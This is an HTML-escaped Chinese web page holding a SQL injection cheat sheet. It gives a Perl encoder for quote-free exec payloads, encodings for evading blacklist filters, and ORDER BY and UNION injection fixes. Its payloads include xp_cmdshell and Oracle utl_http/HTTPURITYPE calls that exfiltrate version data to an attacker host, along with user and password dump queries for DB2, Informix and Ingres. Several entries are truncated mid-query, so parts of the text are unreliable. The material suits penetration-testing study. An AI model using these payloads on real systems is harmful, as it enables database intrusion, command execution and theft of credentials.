&lt;p&gt;采用该技术可以在不向应用程序提交任何引号字符的前提下，执行任意查询。可以使用下列Perl脚本并借助该技术来自动编码SQL语句：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-perl&#34; data-language=&#34;perl&#34;&gt;&lt;code class=&#34;language-perl&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#!/usr/bin/perl&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Enter SQL query to encode:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$teststr&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token filehandle symbol&#34;&gt;&amp;lt;STDIN&amp;gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;chomp &lt;span class=&#34;token variable&#34;&gt;$teststr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$hardcoded_sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;declare @q varchar(8000)&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;select @q=0x***&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;token string&#34;&gt;&#39;exec(@q)&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$prepared&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; encode_sql&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$teststr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$hardcoded_sql&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=~&lt;/span&gt;&lt;span class=&#34;token regex&#34;&gt;s/\*\*\*/$prepared/g&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;\&lt;/span&gt;n&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Encoded SQL&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;\&lt;/span&gt;n&lt;span class=&#34;token operator&#34;&gt;\&lt;/span&gt;n&lt;span class=&#34;token string&#34;&gt;&#34;;
print $hardcoded_sql .&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;\&lt;/span&gt;n&lt;span class=&#34;token string&#34;&gt;&#34;;
sub encode_sql{
@subvar=@_;
my $sqlstr =$subvar[0];
@ASCII = unpack(&#34;&lt;/span&gt;C&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&#34;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sqlstr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@ASCII&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$encoded&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; sprintf&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%lx&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$line&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$encoded_command&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;.=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$encoded&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$encoded_command&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;HTTP-编码&#34;&gt;&lt;a href=&#34;#HTTP-编码&#34; class=&#34;headerlink&#34; title=&#34;HTTP 编码&#34;&gt;&lt;/a&gt;HTTP 编码&lt;/h4&gt;&lt;p&gt;有时可以使用外来编码标准或者借助双重编码来编码输入，以避开那些拒绝已知不良字符 (通常称为黑名单)的输入验证过滤器。&lt;/p&gt;
&lt;p&gt;编码后的SQL元字符&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;字   符&lt;/th&gt;
&lt;th&gt;编码后的变量&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;‘&lt;/td&gt;
&lt;td&gt;%27&lt;br&gt;%2527&lt;br&gt;%u0027&lt;br&gt;%u02b9&lt;br&gt;%ca%b9&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;“&lt;/td&gt;
&lt;td&gt;%22&lt;br&gt;%2522&lt;br&gt;%u0022&lt;br&gt;%uff02&lt;br&gt;%ef%bc%82&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;;&lt;/td&gt;
&lt;td&gt;%3b&lt;br&gt;%253b&lt;br&gt;%u0003b&lt;br&gt;%ufflb&lt;br&gt;%ef%bc%9b&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;(&lt;/td&gt;
&lt;td&gt;%28&lt;br&gt;%2528&lt;br&gt;%u0028&lt;br&gt;%uff08&lt;br&gt;%ef%bc%88&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;)&lt;/td&gt;
&lt;td&gt;%29&lt;br&gt;%2529&lt;br&gt;%u0029&lt;br&gt;%uff09&lt;br&gt;%ef%bc%89&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;［空格］&lt;/td&gt;
&lt;td&gt;%20&lt;br&gt;%2520&lt;br&gt;%u0020&lt;br&gt;%ff00&lt;br&gt;%c0%a0&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;排查SQL注入攻击&#34;&gt;&lt;a href=&#34;#排查SQL注入攻击&#34; class=&#34;headerlink&#34; title=&#34;排查SQL注入攻击&#34;&gt;&lt;/a&gt;排查&lt;strong&gt;SQL&lt;/strong&gt;注入攻击&lt;/h3&gt;&lt;p&gt;排查SQL注入时的参考资料&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;解决方案&lt;/th&gt;
&lt;th&gt;错误/挑战&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;挑战&lt;br&gt;执行一次UNION SELECT攻击，其原始查询用于检索image类型的列。&lt;br&gt;错误消息&lt;br&gt; &lt;code&gt;Image is incompatible with int/ The image data type cannot be selected as DISTINCT because it is not compatible.&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;将&lt;code&gt;UNION SELECT&lt;/code&gt;语句修改成读&lt;code&gt;UNION ALL SELECT&lt;/code&gt;&lt;br&gt;这样能解决当&lt;code&gt;UNION SELECT&lt;/code&gt;尝试与image数据类型进行比较操作时出现的相关问题。&lt;br&gt;例如：&lt;code&gt;UNION ALL SELECT null,null,null&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;挑战&lt;br&gt;注入ORDER BY子句&lt;br&gt;注入的数据位于ORDER BY子句右边。许多常用的技巧（比如UNION SELECT）将不起作用。&lt;br&gt;本例执行下列SQL查询，其中攻击者的数据是注入点：&lt;code&gt;SELECT  FROM products GROUP BY attackers data DESC&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;Microsoft SQL Server &lt;br&gt;Microsoft SQL Server支持使用分号(;)作为每个新查询的堆叠查询的开始。可以按下列方式来实施多种攻击，比如基于时间延迟的数据检索和扩展存储过程的执行：&lt;br&gt;&lt;code&gt;ORDER BY 1；EXEC master..xp_cmdshell&#39;cmd&#39;&lt;/code&gt;&lt;br&gt;还可以利用Microsoft SQL Server并通过错误消息来返回查询结果数据。注入ORDER BY子句时，可以使用下列语法：&lt;br&gt;&lt;code&gt;ORDER BY (1/(@@version)); -- 返回版本号&lt;/code&gt;&lt;br&gt;&lt;code&gt;ORDER BY 1/(SELECT TOP 1 name FROM sysobjects WHERE xtype=&#39;U&#39;);--从sysobjects返回名称&lt;/code&gt;&lt;br&gt;MySQL Server&lt;br&gt;可以在ORDER BY子句中使用基于时间延迟的SQL盲注。如果当前用户为root@localhost，那么下面的例子会触发时间延迟：&lt;br&gt;&lt;code&gt;ORDER BY(IF((SELECT user()=&#39;root@localhost&#39;),sleep(2),1));&lt;/code&gt;&lt;br&gt;Oracle可以使用utl_http包并通过攻击者选择的任何TCP端口来建立向外的HTTP连接。接下来的ORDER BY子句通过端口1000与主机攻击者建立了一条HTTP连接。&lt;br&gt;该HTTP请求在请求路径中包含了Oracle的版本标志：`ORDER BY utl_http.request(‘&lt;a href=&#34;http://attacker:1000/&#34;&gt;http://attacker:1000/&lt;/a&gt;‘&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;挑战&lt;br&gt;因为删除了公共权限，所以ut http无法起作用。&lt;br&gt;错误消息&lt;br&gt;&lt;code&gt;ORA-00904 invalid identifier&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;许多Oracle安全指南建议从utl_http包中删除公共权限。不过，很多人忽视这样一个事实可使用 HTTPURITYPE对象类型实现相同的目的，而且同样能被公共权限访问到。&lt;br&gt;`SELECT HTTPURITYPE(‘&lt;a href=&#34;http://attacker:1000/&#34;&gt;http://attacker:1000/&lt;/a&gt;‘&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;挑战&lt;br&gt;utl inaddr不起作用。&lt;br&gt;存在多种原因，比如版本11中的访问控制列表（ACL），权限已经被撤销以及未安装Java等。&lt;br&gt;错误消息&lt;br&gt;&lt;code&gt;ORA-00904 invalid identifier ORA-24247 network access denied by access control list ACL）-11g ORA-29540 oracle/plsql/net/InternetAddress&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;在可以控制错误消息内容的位置使用不同的函数。根据数据库版本及安装组件的不同，下面是候选函数的一个列表：&lt;br&gt;&lt;code&gt;ORDER BY ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE rownum=1),null,null) ORDER BY SYS.DBMS_AW_XML.READAWMETADATA((SELECT banner FROM v$version WHERE rownum=1),null) ORDER BY CTXSYS.DRITHSX.SN((SELECT banner FROM v$version WHERE rownum=1),user)ORDER BY CTXSYS.CTX_REPORT.TOKEN_TYPE(user,(SELECT banner FROM v$version WHERE rownum=1))&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;挑战&lt;br&gt;执行针对MySQL数据库的UNION SELECT攻击时收到&lt;code&gt;illegal mix of collations&lt;/code&gt;消息。&lt;br&gt;错误消息&lt;br&gt;&lt;code&gt;illegal mix of collations(latinl_swedish_ci,IMPLICIT) and(utf8_general_ci,SYSCONST)for operation &#39;UNION&#39;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;可以使用CAST函数解决该错误。&lt;br&gt;例如：&lt;br&gt;&lt;code&gt;UNION SELECT user(),null,null;&lt;/code&gt;&lt;br&gt;变为：&lt;br&gt;&lt;code&gt;UNION SELECT CAST(user() ASchar),null,null;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;挑战&lt;br&gt;执行针对Microsoft SQL Server数据库的UNION SELECT攻击时收到&lt;code&gt;collation conflict&#34;&lt;/code&gt;消息。&lt;br&gt;错误消息&lt;br&gt;&lt;code&gt;Cannot resolve collation conflict for column 2 in SELECT statement&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;要想解决该错误，一种方法是从数据库读取Collation属性，然后在查询中使用。在下面的例子中，我们执行&lt;code&gt;UNION ALL SELECT&lt;/code&gt;查询来检索sysobject表中的name列。&lt;br&gt;步骤1：检索collation的值&lt;br&gt;&lt;code&gt;UNION ALL SELECT SERVERPROPERTY（&#39;Collation&#39;），null FROM sysobjects&lt;/code&gt;&lt;br&gt;本例中，我们将Collation属性设置为&lt;code&gt;SQL_Latinl_General_CPl_CI_AS&lt;/code&gt;&lt;br&gt;步骤2：在&lt;code&gt;UNION SELECT&lt;/code&gt;中实现collation的值&lt;code&gt;UNION ALL SELECT 1,Name collate SQL Latinl General CPl_CI_AS,null FROM sysobjects&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;其他平台上的SQL注入&#34;&gt;&lt;a href=&#34;#其他平台上的SQL注入&#34; class=&#34;headerlink&#34; title=&#34;其他平台上的SQL注入&#34;&gt;&lt;/a&gt;其他平台上的&lt;strong&gt;SQL&lt;/strong&gt;注入&lt;/h3&gt;&lt;h4 id=&#34;DB2备忘单&#34;&gt;&lt;a href=&#34;#DB2备忘单&#34; class=&#34;headerlink&#34; title=&#34;DB2备忘单&#34;&gt;&lt;/a&gt;DB2备忘单&lt;/h4&gt;&lt;p&gt;在与Web应用集成的众多数据库中，IBM的DB2数据库服务器可能是其中最不流行的一种数据库平台。不过，Linux、UNIX和Windows版本(DB2 LUW)正日渐流行。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;枚举数据库配置信息和模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;提取DB2数据库的配置信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;版本&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT versionnumber, version_timestamp  FROM sysibm.sysversions;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT user FROM sysibm.sysdummy1;&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT session_user FROM sysibm.sysdummyl;&lt;/code&gt;&lt;br&gt;&lt;code&gt; SELECT system_user FROM sysibm.sysdummyl;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT grantee FROM syscat.dbauth;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户权限&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT * FROM syscat.dbauth WHERE  grantee =user;&lt;/code&gt;&lt;br&gt;&lt;code&gt; SELECT * FROM syscat.tabauth WHERE grantee =user;&lt;/code&gt;&lt;br&gt;&lt;code&gt; SELECT *  FROM syscat.tabauth;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;提取DB2数据库的模式信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;当前数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT current_server FROM sysibm.sysdummyl;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT schemaname FROM syscat.schemata;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出表&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT name FROM sysibm.systables;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出列&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT name, tbname, coltype FROM sysbibm.syscolumns;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;SQL盲注函数：DB2&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SQL盲注函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查  询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;字符串长度&lt;/td&gt;
&lt;td&gt;&lt;code&gt;LENGTH()&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;从给定字符串中提取子串&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SUBSTRING(string,offset,length) FROM  sysibm.sysdummyl;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;字符串(‘ABC’)不带单引号的表示方式&lt;/td&gt;
&lt;td&gt;`SELECT CHR(65)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id=&#34;Informix-备忘单&#34;&gt;&lt;a href=&#34;#Informix-备忘单&#34; class=&#34;headerlink&#34; title=&#34;Informix 备忘单&#34;&gt;&lt;/a&gt;Informix 备忘单&lt;/h4&gt;&lt;p&gt;Informix数据库服务器也是由IBM负责经销的，相比其他数据库平台，它不是很常见。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;枚举数据库配置信息和模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;提取Informix数据库的配置信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;版本&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT DBINFO(&#39;version&#39;,&#39;full&#39;) FROM systables WHERE tabid = 1;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT USER FROM systables WHERE tabid = 1;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;select usertype,username,password from sysusers;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户权限&lt;/td&gt;
&lt;td&gt;&lt;code&gt;select tabname, tabauth, grantor, grantee FROM systabauth join systables on systables.tabid = systabauth.tabid&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;数据库服务器主机名&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT DBINFO(&#39;dbhostname&#39;) FROM systables WHERE tabid=1;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt; 提取Informix数据库的模式信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;当前数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT DBSERVERNAME FROM systables WHERE tabid = 1;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT name, owner FROM sysdatabases;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出表&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT tabname FROM systables; &lt;/code&gt;&lt;br&gt;&lt;code&gt; SELECT tabname, viewtext FROM sysviews join systables on systables.tabid = sysviews.tabid;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出列&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT tabname, colname, coltype FROM  syscolumns join systables on  syscolumns.tabid = systables.tabid;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;SQL 盲注函数：Informix&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SQL盲注函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查  询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;字符串长度&lt;/td&gt;
&lt;td&gt;&lt;code&gt;LENGTH()&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;从给定字符串中提取子串&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT SUBSTRING(&#39;ABCD&#39; FROM 4 FOR 1) FROM  systables where tabid = 1;  --返回&#39;D&#39;;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;字符串(‘ABC’)不带单引号的表示方式&lt;/td&gt;
&lt;td&gt;`SELECT CHR(65)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id=&#34;Ingres-备忘单&#34;&gt;&lt;a href=&#34;#Ingres-备忘单&#34; class=&#34;headerlink&#34; title=&#34;Ingres 备忘单&#34;&gt;&lt;/a&gt;Ingres 备忘单&lt;/h4&gt;&lt;p&gt;Ingres是一种可以在所有主流操作系统上使用的开源数据库。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;枚举数据库配置信息和模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;提取Ingres数据库的配置信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;版本&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT dbsminfo(&#39;version&#39;);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT dbsminfo(&#39;system user&#39;);&lt;/code&gt;&lt;br&gt;&lt;code&gt; SELECT dbsminfo(&#39;session user&#39;);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT name, password FROM iiuser;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户权限&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT dbsminfo(&#39;select_syscat&#39;);&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT dbsminfo(&#39;db_privileges&#39;);&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT  dbsminfo(&#39;current_priv_mask&#39;); &lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT dbsminfo(&#39;db_admin&#39;);&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT dbsminfo(&#39;security_priv&#39;);&lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT dbsminfo(&#39;create_table&#39;); &lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT dbsminfo(&#39;create procedure&#39;);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt; 提取Ingres数据库的模式信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;当前数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT dbmsinfo(database&#39;);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出表&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT relid, relowner, relloc FROM iirelation WHERE relowner != &#39;$ingres&#39;;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出列&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT column_name, column_datatype,  table_name, table_owner FROM iicolumns;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;SQL盲注函数：Ingres&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SQL盲注函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;字符串长度&lt;/td&gt;
&lt;td&gt;&lt;code&gt;LENGTH()&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;从给定字符串中提取子串&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT substr(string, offset, length); -- &lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;字符串(‘ABC’)不带单引号的表示方式&lt;/td&gt;
&lt;td&gt;`SELECT chr(65)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h4 id=&#34;Sybase-备忘单&#34;&gt;&lt;a href=&#34;#Sybase-备忘单&#34; class=&#34;headerlink&#34; title=&#34;Sybase 备忘单&#34;&gt;&lt;/a&gt;Sybase 备忘单&lt;/h4&gt;&lt;p&gt;Sybase与Microsoft SQL Server共享了共同的遗产，在Microsoft SQL Server中使用的很多 方法对于Sybase同样有效，往往只须在所用命令的语法上稍加修改即可。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;枚举数据库配置信息和模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;提取Sybase数据库的配置信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
